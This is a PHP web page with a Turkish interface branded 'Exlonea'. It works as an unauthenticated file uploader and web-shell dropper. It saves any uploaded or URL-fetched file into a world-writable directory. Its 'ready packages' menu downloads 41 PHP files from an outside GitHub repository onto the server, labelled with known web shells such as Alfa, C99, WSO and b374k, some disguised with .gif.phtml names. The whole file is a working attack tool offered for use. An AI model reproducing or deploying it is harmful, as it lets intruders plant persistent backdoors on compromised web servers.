<?php
$uploadDir = 'exlonea/';
$successMessage = "";
$uploadedFileLink = ""; // En son yüklenen dosyanın linkini tutacak değişken


// Dosya yükleme işlemi
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0777, true);
    }
    $targetFile = $uploadDir . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
        $successMessage = "<div class='alert success'>Dosya başarıyla yüklendi: <a href='$targetFile' target='_blank'>$targetFile</a></div>";
    } else {
        $successMessage = "<div class='alert error'>Dosya yüklenirken bir hata oluştu.</div>";
    }
}

// Link ile dosya indirme ve kaydetme işlemi
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['file_link'])) {
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0777, true);
    }
    $fileLink = $_POST['file_link'];
    $fileName = basename(parse_url($fileLink, PHP_URL_PATH));
    $targetFile = $uploadDir . $fileName;

    $fileContent = file_get_contents($fileLink);
    if ($fileContent !== false && file_put_contents($targetFile, $fileContent)) {
        $successMessage = "<div class='alert success'>Dosya başarıyla indirildi ve kaydedildi: <a href='$targetFile' target='_blank'>$targetFile</a></div>";
    } else {
        $successMessage = "<div class='alert error'>Dosya indirilemedi veya kaydedilemedi.</div>";
    }
}

// Hazır paket indirme işlemi
if (isset($_GET['package'])) {
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0777, true);
    }

    // Paketlerin bağlantıları ve dosya isimleri
    $packages = [
        1 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/1.php", "1.php"],
        2 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/2.php", "2.php"],
        3 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/3.php", "3.php"],
        4 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/4.php", "4.php"],
        5 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/5.php", "5.php"],
        6 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/6.php", "6.php"],
        7 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/7.php", "7.php"],
        8 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/8.php", "8.php"],
        9 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/9.php", "9.php"],
        10 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/10.php", "10.php"],
        11 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/11.php", "11.php"],
        12 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/12.gif.phtml", "12.gif.phtml"],
        13 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/13.php", "13.php"],
        14 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/14.php", "14.php"],
        15 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/15.php", "15.php"],
        16 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/16.gif.phtml", "16.gif.phtml"],
        17 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/17.php", "17.php"],
        18 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/18.php", "18.php"],
        19 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/19.php", "19.php"],
        20 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/20.php", "20.php"],
        21 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/21.php", "21.php"],
        22 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/22.php", "22.php"],
        23 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/23.php", "23.php"],
        24 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/24.php", "24.php"],
        25 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/25.php", "25.php"],
        26 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/26.php", "26.php"],
        27 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/27.php", "27.php"],
        28 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/28.php", "28.php"],
        29 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/29.phtml", "29.phtml"],
        30 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/30.php", "30.php"],
        31 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/31.php", "31.php"],
        32 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/32.php", "32.php"],
        33 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/33.php", "33.php"],
        34 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/34.php", "34.php"],
        35 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/35.php", "35.php"],
        36 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/36.php", "36.php"],
        37 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/37.php", "37.php"],
        38 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/38.php", "38.php"],
        39 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/39.php", "39.php"],
        40 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/40.php", "40.php"],
        41 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/41.php", "41.php"],
        
        // İlerleyen zamanlarda başka paketler eklemek için buraya yeni elemanlar ekleyebilirsiniz.
    ];

    $packageNumber = intval($_GET['package']);

    // Eğer geçerli paket varsa, ilgili dosyayı indir ve kaydet
    if (isset($packages[$packageNumber])) {
        $packageLink = $packages[$packageNumber][0];
        $fileName = $packages[$packageNumber][1];
        $targetFile = $uploadDir . $fileName;

        $fileContent = file_get_contents($packageLink);
        if ($fileContent !== false && file_put_contents($targetFile, $fileContent)) {
            $successMessage = "<div class='alert success'>Dosya başarıyla indirildi ve kaydedildi: <a href='$targetFile' target='_blank'>$targetFile</a></div>";
        } else {
            $successMessage = "<div class='alert error'>Dosya indirilemedi veya kaydedilemedi.</div>";
        }
    } else {
        $successMessage = "<div class='alert error'>Geçersiz paket numarası.</div>";
    }
}

$currentFile = basename($_SERVER['PHP_SELF']);
?>

<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EXLONEA - Dosya Yükleme</title>
    <link href="https://fonts.googleapis.com/css2?family=Cinzel+Decorative:wght@400&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            padding: 0 15px;
            box-sizing: border-box;
        }
        .container {
            width: 100%;
            max-width: 400px;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            text-align: center;
            margin: 10px 0;
            box-sizing: border-box;
        }
        .header {
            background-color: #780000;
            padding: 15px;
            border-radius: 10px 10px 0 0;
            margin: -20px -20px 20px -20px;
        }
        .header h1 {
            font-family: 'Cinzel Decorative', serif;
            font-size: 40px;
            color: white;
            letter-spacing: 2px;
            font-weight: 400; /* İnce yazı stili için bu kısmı değiştirdim */
        }
        .header h1 span {
            color: #ffffff;
        }
        .header a {
            text-decoration: none;
            color: white;
        }
        input, button {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            box-sizing: border-box;
        }
        button {
            background-color: #780000;
            color: white;
            border: none;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #660000;
        }
        .alert {
            padding: 10px;
            margin-top: 15px;
            border-radius: 5px;
        }
        .alert.success {
            background-color: #d4edda;
            color: #155724;
        }
        .alert.error {
            background-color: #f8d7da;
            color: #721c24;
        }
        .dropdown {
            background-color: #780000;
            color: white;
            padding: 12px;
            margin-top: 10px;
            border-radius: 5px;
            cursor: pointer;
            text-align: center;
            user-select: none;
        }
        .dropdown:hover {
            background-color: #660000;
        }
        .dropdown-menu {
            display: none;
            background: white;
            border: 1px solid #ccc;
            border-radius: 5px;
            max-height: 200px;
            overflow-y: auto;
        }
        .dropdown-menu a {
            display: block;
            padding: 10px;
            text-decoration: none;
            color: black;
        }
        .dropdown-menu a:hover {
            background-color: #d4edda;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <a href="<?php echo $currentFile; ?>"><h1>e<span>X</span>lONeA</h1></a>
        </div>

        <form action="" method="POST" enctype="multipart/form-data">
            <div class="dropdown" onclick="document.getElementById('fileInput').click();">Dosya Seç</div>
            <input type="file" id="fileInput" name="file" style="display: none;" required onchange="updateFileName()">
            <span id="fileName" style="display: block; margin-top: 10px; font-weight: bold;"></span> <!-- Seçilen dosya adını gösterecek alan -->
            <button type="submit">Yükle</button>
        </form>

        <form action="" method="POST">
            <input type="url" name="file_link" placeholder="Dosya linkini girin" required>
            <button type="submit">Ekle</button>
        </form>

        <div class="dropdown" onclick="toggleMenu()">Hazır Paketler</div>
        <div class="dropdown-menu" id="packageMenu">
            <a href="?package=1">Alfa-1</a>
            <a href="?package=2">Alfa-2</a>
            <a href="?package=3">Alfa-3</a>
            <a href="?package=4">Alfa-4</a>
            <a href="?package=5">Alfa-5</a>
            <a href="?package=6">Alfa-6</a>
            <a href="?package=7">Alfa-7</a>
            <a href="?package=8">Alfa-8</a>
            <a href="?package=9">Alfa-9</a>
            <a href="?package=10">Alfa-10</a>
            <a href="?package=11">Alfa-11</a>
            <a href="?package=12">Alfa-12</a>
            <a href="?package=13">Alfa-13</a>
            <a href="?package=14">Alfa-14</a>
            <a href="?package=15">Alfa-15</a>
            <a href="?package=16">Alfa-16</a>
            <a href="?package=17">Alfa-17</a>
            <a href="?package=22">Alfa-18</a>
            <a href="?package=18">C99-1</a>
            <a href="?package=19">C99-2</a>
            <a href="?package=20">C99-3</a>
            <a href="?package=21">Wso-1</a>
            <a href="?package=23">Wso-2</a>
            <a href="?package=24">Wso-3</a>
            <a href="?package=25">K2LL33D</a>
            <a href="?package=26">Spademini</a>
            <a href="?package=27">P.A.S-1 (asdf-avto)</a>
            <a href="?package=28">P.A.S-2 (asdf-avto)</a>
            <a href="?package=29">P.A.S-3 (asdf-avto)</a>
            <a href="?package=30">P.A.S-4 (asdf-avto)</a>
            <a href="?package=31">P.A.S-5 (asdf-avto)</a>
            <a href="?package=32">P.A.S-6 (asdf-avto)</a>
            <a href="?package=33">P.A.S-7 (asdf-avto)</a>
            <a href="?package=34">b374k</a>
            <a href="?package=35">Gecko-1</a>
            <a href="?package=36">Gecko-2</a>
            <a href="?package=37">Gecko-3</a>
            <a href="?package=38">Mini</a>
            <a href="?package=39">Marijuana</a>
            <a href="?package=40">Exlonea</a>
            <a href="?package=41">Phs</a>
            
        </div>

        <?php if ($successMessage) echo $successMessage; ?>
    </div>
    <div class="footer" style="color:#a2a2a2;">Copyright © Exlonea - 2025</div>

    <script>
        function toggleMenu() {
            var menu = document.getElementById("packageMenu");
            menu.style.display = (menu.style.display === "block" ? "none" : "block");
        }

        // Dosya adı güncelleme fonksiyonu
        function updateFileName() {
            var fileInput = document.getElementById('fileInput');
            var fileName = document.getElementById('fileName');
            fileName.textContent = fileInput.files[0] ? fileInput.files[0].name : ''; // Seçilen dosyanın adını göster
        }
    </script>
</body>
</html>